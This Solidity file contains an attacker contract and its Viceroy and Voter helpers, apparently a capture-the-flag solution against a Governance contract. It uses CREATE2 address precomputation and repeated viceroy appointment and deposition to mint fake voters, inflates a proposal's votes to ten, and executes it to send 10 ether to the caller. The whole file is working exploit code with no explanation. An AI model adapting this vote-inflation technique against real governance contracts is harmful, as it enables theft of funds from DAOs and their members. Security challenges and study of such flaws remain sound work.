// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "../Viceroy.sol";

contract GovernanceAttacker {
    function attack(Governance governance) external {
        bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 10 ether);
        uint256 proposalId = uint256(keccak256(proposal));

        for (uint256 i = 1; i < 3; /* replace with 3 */ i++) {
            (uint256 votes, bytes memory data) = governance.proposals(proposalId);

            if (i == 1) {
                assert(votes == 0);
                assert(data.length == 0);
            }

            if (i == 2) {
                assert(votes == 5);
                assert(data.length != 0);
            }

            bytes memory creationCode = type(Viceroy).creationCode;
            bytes memory bytecode = abi.encodePacked(creationCode, abi.encode(governance, i, proposalId, proposal));
            bytes32 salt = bytes32(uint256(487)); // 487 is just a random number

            address viceroy = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)))))
            );

            governance.appointViceroy(viceroy, 1);
            Viceroy _viceroy = new Viceroy{salt: salt}(governance, i, proposalId, proposal);

            assert(address(_viceroy) == viceroy);

            governance.deposeViceroy(viceroy, 1);
        }

        (uint256 v,) = governance.proposals(proposalId);
        assert(v == 10);

        governance.executeProposal(proposalId);
    }
}

contract Viceroy {
    constructor(Governance governance, uint256 _i, uint256 proposalId, bytes memory proposal) {
        uint256 i = _i == 1 ? 1 : 6;
        uint256 length = i + 5;

        if (i == 1) governance.createProposal(address(this), proposal); // Create just one proposal

        for (; i < length; i++) {
            bytes memory creationCode = type(Voter).creationCode;
            bytes memory bytecode = abi.encodePacked(creationCode, abi.encode(governance, proposalId));
            bytes32 salt = bytes32(i);

            address voter = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)))))
            );

            governance.approveVoter(voter);
            new Voter{salt: salt}(governance, proposalId);
        }
    }
}

contract Voter {
    constructor(Governance governance, uint256 proposalId) {
        bool inFavor = true;
        address viceroy = msg.sender;
        governance.voteOnProposal(proposalId, inFavor, viceroy);
    }
}
